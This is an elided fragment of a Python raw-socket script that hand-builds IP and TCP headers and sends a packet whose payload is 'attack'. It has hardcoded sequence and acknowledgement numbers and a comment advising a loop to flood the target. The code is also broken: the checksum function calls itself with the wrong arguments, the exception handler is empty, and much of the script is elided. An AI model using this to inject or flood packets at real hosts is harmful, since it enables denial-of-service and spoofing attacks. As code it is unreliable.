...
def ip_header_create(src_ip, dst_ip):
	ip_ihl = 5
	ip_ver = 4
	ip_tos = 0
...
def tcp_header_create(tcp_cfg, check_sum):
	tcp_source = tcp_cfg['src_port']   # source port
	tcp_dest = tcp_cfg['dst_port']   # destination port
	tcp_seq = 3188268777
	tcp_ack_seq = 4269447631
...
def pseudo_header_create(ip_cfg, tcp_cfg, data):
	...
	source_address = socket.inet_aton( ip_cfg['src_ip'] )
	dest_address = socket.inet_aton(ip_cfg['dst_ip'])
	placeholder = 0
...
def cal_checksum(cfg, data):
	...
	tcp_check = cal_checksum(pseudo_header)
	return tcp_check
...
def main():
	try:
		cfg = config()
		s = rawsocket()
		ip_header = ip_header_create(cfg['src_ip'], cfg['dst_ip'])
		data = 'attack'
		tcp_check = cal_checksum(cfg, data)
		tcp_header = tcp_header_create(cfg['tcp'], tcp_check)
		packet = ip_header + tcp_header + data
		s.sendto(packet, (cfg['ip']['dst_ip'] , 0 ))    # put this in a loop if you want to flood the target
	except:
